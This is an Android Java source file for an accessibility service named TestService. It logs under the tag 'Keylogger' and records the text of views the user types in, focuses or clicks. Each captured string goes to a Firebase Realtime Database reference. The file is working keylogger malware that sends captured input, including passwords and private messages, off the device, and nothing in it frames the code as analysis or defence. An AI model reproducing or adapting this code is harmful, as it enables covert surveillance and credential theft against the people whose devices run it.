package com.example.root.hmm;

import android.accessibilityservice.AccessibilityService;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetManager;
import android.provider.Settings;
import android.support.v4.app.NotificationCompat;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;

import static android.content.ContentValues.TAG;

public class TestService extends AccessibilityService {
    FirebaseDatabase database;
    DatabaseReference myRef;
    public TestService() {
        Log.d("Keylogger", "Start service");
    }
    @Override
    public void onServiceConnected() {
        Log.d("Keylogger", "Starting service");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {


        switch(event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String dta = event.getText().toString();

                Log.d(TAG, "onAccessibilityEvent: "+dta);
                dataa(dta);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String dta = event.getText().toString();
                Log.d(TAG, "onAccessibilityEvent: "+dta);
                dataa(dta);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String dta = event.getText().toString();
                dataa(dta);
                Log.d(TAG, "onAccessibilityEvent: "+dta);
                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {

    }
    private void dataa(String mes){
        database = FirebaseDatabase.getInstance();
        myRef = database.getReference("message");

        myRef.setValue(mes);
    }

}
